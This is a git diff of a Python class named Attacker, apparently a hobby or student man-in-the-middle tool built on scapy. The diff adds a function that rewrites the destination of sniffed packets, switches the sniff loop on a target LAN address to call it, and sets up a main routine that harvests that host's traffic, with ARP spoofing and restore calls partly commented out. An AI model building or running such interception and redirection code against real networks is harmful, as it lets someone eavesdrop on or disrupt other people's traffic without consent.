@@ -25,6 +25,11 @@ class Attacker:
         self.s.restore(self.targetIP, self.gatewayIP)
         self.s.restore(self.gatewayIP, self.targetIP)
 
+    def stop_traffic(self, packet):
+        print(packet[0][1].dst)
+        packet[0][1].dst = self.targetIP  # reroutes the packet to the owner later to be changed to trash address
+        # print(packet[0][1].dst)
+
     def packet_interact(self, packet):
         """This Func will either discard alter or let the packet go depending on input"""
         # TODO: before action i need to build the packet and present it to the attacker maybe packet.summary()?
@@ -54,18 +59,18 @@ class Attacker:
         """This Func will present the relevant network traffic"""
         # sniff() uses Berkeley Packet Filter (BPF) syntax
         filter_param = "host" + " " + self.targetIP  # This will be the filter for the scapy that runs from attacker pc
-        while 'sniffing':
-            pkt = scapy.sniff(filter=filter_param, count=1, prn=self.packet_interact)  # filter will use self.target_ip
+        while 'sniffing':  # need to check if default sniff is own PC
+            pkt = scapy.sniff(filter=filter_param, count=1, prn=self.stop_traffic)  # filter will use self.target_ip
             # prn is  what func to apply to each packet
             # print(pkt[0])
             time.sleep(0.5)
 
     def main(self):
         """Main function of the Attacker"""
-        pass
+        # self.spoof()
+        # input("begin?")
+        self.harvest_packets()
 
 
-a = Attacker(target_ip="192.168.1.50")
-# a.s.restore("192.168.1.1", "192.168.1.6")
-# a.spoof()
-a.harvest_packets()
+a = Attacker(target_ip="192.168.1.36")
+a.main()
